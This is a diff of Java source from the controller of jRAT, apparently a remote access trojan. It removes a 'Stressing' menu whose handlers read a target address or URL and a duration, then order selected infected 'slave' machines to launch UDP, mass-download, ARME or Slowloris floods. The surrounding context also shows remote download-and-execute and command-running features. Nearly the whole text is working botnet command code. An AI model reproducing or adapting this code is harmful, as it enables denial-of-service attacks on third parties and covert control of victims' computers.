@@ -29,7 +29,6 @@ import javax.swing.table.DefaultTableModel;
 
 import jrat.api.RATMenuItem;
 import jrat.api.RATObject;
-import se.jrat.common.Flood;
 import se.jrat.common.downloadable.Downloadable;
 import se.jrat.common.utils.DataUnits;
 import se.jrat.controller.AbstractSlave;
@@ -46,7 +45,6 @@ import se.jrat.controller.packets.outgoing.Packet11Disconnect;
 import se.jrat.controller.packets.outgoing.Packet14VisitURL;
 import se.jrat.controller.packets.outgoing.Packet17DownloadExecute;
 import se.jrat.controller.packets.outgoing.Packet18Update;
-import se.jrat.controller.packets.outgoing.Packet22Flood;
 import se.jrat.controller.packets.outgoing.Packet36Uninstall;
 import se.jrat.controller.packets.outgoing.Packet37RestartJavaProcess;
 import se.jrat.controller.packets.outgoing.Packet38RunCommand;
@@ -326,157 +324,6 @@ public class PanelMainClients extends JScrollPane {
 		JMenu mnNetworking = new JMenu("Networking");
 		mnNetworking.setIcon(IconUtils.getIcon("process"));
 		popupMenu.add(mnNetworking);
-
-		JMenu mnStressing = new JMenu("Stressing");
-		mnStressing.setIcon(IconUtils.getIcon("firewall"));
-		mnNetworking.add(mnStressing);
-
-		JMenuItem mntmUdpFlood = new JMenuItem("UDP");
-		mnStressing.add(mntmUdpFlood);
-		mntmUdpFlood.addActionListener(new ActionListener() {
-			public void actionPerformed(ActionEvent arg0) {
-				String target = Utils.showDialog("UDP flood", "Enter IP:Port to flood");
-				if (target == null) {
-					return;
-				}
-				try {
-					String[] targetargs = target.split(":");
-					Integer.parseInt(targetargs[1]);
-				} catch (Exception ex) {
-					JOptionPane.showMessageDialog(null, "Enter valid IP:Port!", "Error", JOptionPane.ERROR_MESSAGE);
-					return;
-				}
-				String time = Utils.showDialog("UDP flood", "Enter seconds to flood");
-				if (time == null) {
-					return;
-				}
-				int time1;
-				try {
-					time1 = Integer.parseInt(time);
-				} catch (Exception ex) {
-					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
-					return;
-				}
-				List<AbstractSlave> servers = getSelectedSlaves();
-				if (servers.size() > 0) {
-					for (AbstractSlave sl : servers) {
-						if (sl instanceof Slave) {
-							((Slave)sl).addToSendQueue(new Packet22Flood(Flood.UDP, target, time1));
-						}
-					}
-				}
-			}
-		});
-		mntmUdpFlood.setIcon(null);
-
-		JMenuItem mntmMassDownloadFlood = new JMenuItem("Mass download");
-		mnStressing.add(mntmMassDownloadFlood);
-		mntmMassDownloadFlood.addActionListener(new ActionListener() {
-			public void actionPerformed(ActionEvent arg0) {
-				String target = Utils.showDialog("Mass download flood", "Enter website URL to download");
-				if (target == null) {
-					return;
-				}
-
-				String time = Utils.showDialog("Mass download flood", "Enter seconds to download");
-				if (time == null) {
-					return;
-				}
-				int time1;
-				try {
-					time1 = Integer.parseInt(time);
-				} catch (Exception ex) {
-					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
-					return;
-				}
-				List<AbstractSlave> servers = getSelectedSlaves();
-				if (servers.size() > 0) {
-					for (AbstractSlave sl : servers) {
-						if (sl instanceof Slave) {
-							((Slave)sl).addToSendQueue(new Packet22Flood(Flood.DRAIN, target, time1));
-						}
-					}
-				}
-			}
-		});
-		mntmMassDownloadFlood.setIcon(null);
-
-		JMenuItem mntmArme = new JMenuItem("ARME");
-		mnStressing.add(mntmArme);
-		mntmArme.addActionListener(new ActionListener() {
-			public void actionPerformed(ActionEvent arg0) {
-				String target = Utils.showDialog("ARME flood", "Enter Host:Port/IP:Port to flood");
-				if (target == null) {
-					return;
-				}
-				try {
-					String[] targetargs = target.split(":");
-					Integer.parseInt(targetargs[1]);
-				} catch (Exception ex) {
-					JOptionPane.showMessageDialog(null, "Enter valid IP:Port!", "Error", JOptionPane.ERROR_MESSAGE);
-					return;
-				}
-				String time = Utils.showDialog("ARME flood", "Enter seconds to flood");
-				if (time == null) {
-					return;
-				}
-				int time1;
-				try {
-					time1 = Integer.parseInt(time);
-				} catch (Exception ex) {
-					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
-					return;
-				}
-				List<AbstractSlave> servers = getSelectedSlaves();
-				if (servers.size() > 0) {
-					for (AbstractSlave sl : servers) {
-						if (sl instanceof Slave) {
-							((Slave)sl).addToSendQueue(new Packet22Flood(Flood.ARME, target, time1));
-						}
-					}
-				}
-			}
-		});
-		mntmArme.setIcon(null);
-
-		JMenuItem mntmSlowloris = new JMenuItem("Slowloris");
-		mntmSlowloris.addActionListener(new ActionListener() {
-			public void actionPerformed(ActionEvent arg0) {
-				String target = Utils.showDialog("Slowloris flood", "Enter Host:Port/IP:Port to flood");
-				if (target == null) {
-					return;
-				}
-				try {
-					String[] targetargs = target.split(":");
-					Integer.parseInt(targetargs[1]);
-				} catch (Exception ex) {
-					JOptionPane.showMessageDialog(null, "Enter valid IP:Port!", "Error", JOptionPane.ERROR_MESSAGE);
-					return;
-				}
-				String time = Utils.showDialog("Slowloris flood", "Enter seconds to flood");
-				if (time == null) {
-					return;
-				}
-				int time1;
-				try {
-					time1 = Integer.parseInt(time);
-				} catch (Exception ex) {
-					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
-					return;
-				}
-				List<AbstractSlave> servers = getSelectedSlaves();
-				if (servers.size() > 0) {
-					for (AbstractSlave sl : servers) {
-						if (sl instanceof Slave) {
-							((Slave)sl).addToSendQueue(new Packet22Flood(Flood.SLOWLORIS, target, time1));
-						}
-					}
-				}
-			}
-		});
-		mnStressing.add(mntmSlowloris);
-
-		mnNetworking.addSeparator();
 
 		JMenuItem mntmexe = new JMenuItem("Download and Execute");
 		mnNetworking.add(mntmexe);
